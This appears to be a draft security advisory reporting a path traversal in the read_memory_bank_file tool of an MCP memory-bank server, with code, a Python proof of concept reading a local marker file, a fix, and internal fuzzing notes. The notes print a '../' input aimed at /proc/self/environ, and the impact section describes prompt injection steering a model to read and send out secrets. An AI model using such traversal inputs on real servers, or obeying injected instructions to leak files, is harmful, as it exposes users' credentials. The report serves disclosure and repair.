# Path traversal in `read_memory_bank_file`: `filename` can read files outside the memory bank

**Repository:** `movibe/memory-bank-mcp` · **Tool:** `read_memory_bank_file` · **Tested commit:** `7851e06`
**Weakness:** CWE-22 Path Traversal

## Summary
`read_memory_bank_file` is meant to return one file from the active `memory-bank/` directory. The `filename` argument is joined onto that directory with `path.join` and read without any containment check, so `../` segments (or enough of them) reach any file the server process can read. The content is returned to the client as the tool result.

## Details
The handler passes `filename` straight through (`src/server/tools/index.ts:97-101`, `src/server/tools/CoreTools.ts:290`) to `MemoryBankManager.readFile` (`src/core/MemoryBankManager.ts:283-294`):

```ts
async readFile(filename: string): Promise<string> {
  ...
  const filePath = path.join(this.memoryBankDir, filename);
  if (!await FileUtils.fileExists(filePath)) {
    throw new Error(`File ${filename} not found in Memory Bank`);
  }
  return await FileUtils.readFile(filePath);
```

`path.join` normalises `..` segments, so `path.join('/tmp/tofu-poc/project/memory-bank', '../../outside.txt')` is `/tmp/tofu-poc/outside.txt`. Nothing checks that `filePath` is still under `this.memoryBankDir`.

## Steps to reproduce
1. Prerequisites: Node.js 18+ and Python with the `mcp` package. Create a project directory and a marker file outside it:
   ```bash
   mkdir -p /tmp/tofu-poc/project
   echo marker > /tmp/tofu-poc/outside.txt
   ```
2. Start the server as the README describes (`npx @movibe/memory-bank-mcp`; the tested commit is the 0.4.1 release commit), with `/tmp/tofu-poc/project` as the working directory. From a source checkout: `bun install && bun run build`, then `node build/index.js`.
3. Create the memory bank inside the project, then read the marker through `../`. The memory bank lives at `/tmp/tofu-poc/project/memory-bank`, so `../../outside.txt` resolves to `/tmp/tofu-poc/outside.txt`:

   ```python
   import asyncio
   from mcp import ClientSession, StdioServerParameters
   from mcp.client.stdio import stdio_client

   async def main():
       server = StdioServerParameters(
           command="npx",
           args=["-y", "@movibe/memory-bank-mcp@0.4.1", "--path", "/tmp/tofu-poc/project"],
           cwd="/tmp/tofu-poc/project",
       )
       async with stdio_client(server) as (read, write):
           async with ClientSession(read, write) as session:
               await session.initialize()
               await session.call_tool("initialize_memory_bank", {"path": "/tmp/tofu-poc/project"})
               result = await session.call_tool("read_memory_bank_file", {"filename": "../../outside.txt"})
               print(result)

   asyncio.run(main())
   ```
4. Observe: the tool result text is `marker`, the content of `/tmp/tofu-poc/outside.txt`.

## Expected behavior
The tool rejects any `filename` that resolves outside the memory bank directory, for example with an "invalid filename" error.

## Actual behavior
The file outside the memory bank is read and returned. During fuzzing a longer `../` chain of the same form read a file outside the fuzzer's scratch directory and returned the server process's full environment variables as the tool result.

## Impact
In MCP the model chooses tool arguments, and prompt injection in a document, web page or memory bank file the model reads can steer it to call this tool with a `../` path. The server then returns any file readable by the user running it: source files, configuration, credentials, or the process environment (which often holds API keys). The content goes back into the model context, where further injected instructions can push it to an external sink. This is an arbitrary file read with the server user's privileges.

## Suggested fix
Resolve the path and require it to stay under the memory bank directory:

```ts
const root = path.resolve(this.memoryBankDir);
const filePath = path.resolve(root, filename);
const rel = path.relative(root, filePath);
if (rel === '' || rel.startsWith('..') || path.isAbsolute(rel)) {
  throw new Error(`Invalid filename: ${filename}`);
}
```

Calling `fs.realpath` on the result before the check also stops symlinks inside the memory bank from pointing outside it. The same helper should be used by `writeFile` (see the companion report for `write_memory_bank_file`).

## Status on the default branch
Still present at `7851e06` (2025-03-17). The default branch has no commits after the tested one.

## Prior reports
- No issue or PR reports this. Searched all 1 issue and 9 pull requests (fetched 2026-10-01); none mentions `filename` validation, path traversal, `readFile`/`writeFile` containment or any security problem. PRs #6 and #8 describe initialization and logging changes only; `readFile` on the default branch still has no containment check.
- Documentation: docs/mcp-protocol-specification.md: "Reads a file from the Memory Bank" with "`filename`: Name of the file to read" (the documented contract is a file inside the memory bank, which the code does not enforce).
- Documentation: docs/requirements.md (a copy of the MCP documentation kept in the repo): "Sanitize file paths to prevent directory traversal" (general guidance; the server does not follow it here).

<details>
<summary>Internal notes (remove before filing)</summary>

- ToFu class / sanitizers: path-traversal; `check_path_traversal`.
- Campaigns and executions: corpus-sbx 1024 exec / 7 success; e2-0922 512 / 2. Most calls failed because the target file did not exist.
- Evidence (verbatim, trimmed):
  - `{'filename': '../../../../../../../../proc/self/environ'}` -> output began `SHELL=/bin/bash\x00TOFU_KILL_GRACE=60\x00...PWD=/home/mza6485/.tofu_scratch/movibe__memory-bank-mcp__read_memory_bank_file\x00...` (full process environment of the fuzzing host; do not paste it publicly).
  - `{'filename': '..\\..\\..\\..\\windows\\win.ini'}` -> `test content for windows path traversal`. This is NOT traversal on Linux: backslashes are literal filename characters, and the file was created inside the memory bank by an earlier `write_memory_bank_file` call in the same run.
- Hand-check hints: real. `filename` reaches `fs.readFile` through `path.join` with no containment check (`MemoryBankManager.ts:289`), and the logged `/proc/self/environ` read confirms it end to end. npm version `0.4.1` matches `package.json` at the tested commit; registry not checked. Reproduction derived from code plus the logged success, not run.
</details>
